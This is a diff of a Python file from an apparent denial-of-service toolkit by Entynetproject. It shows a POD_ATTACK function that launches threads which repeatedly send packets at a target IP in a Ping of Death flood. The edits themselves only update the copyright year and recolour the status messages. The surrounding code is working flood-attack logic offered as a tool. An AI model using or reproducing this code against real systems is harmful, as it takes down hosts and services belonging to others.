@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -36,7 +36,7 @@ def POD_ATTACK(threads, attack_time, target):
 
 	target_ip = target
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting POD attack...")
 	
 	threads_list = []
 
@@ -49,11 +49,11 @@ def POD_ATTACK(threads, attack_time, target):
 		while not FINISH:
 			for i in range(16):
 				send(packet, verbose = False)
-				print("[+] 60k bytes send..")
+				print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[#] Staring thread " + str(thread))
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
 		t = Thread(target = pod_flood)
 		t.start()
 		threads_list.append(t)
@@ -64,4 +64,4 @@ def POD_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[!] Ping of Death attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" POD attack completed.")
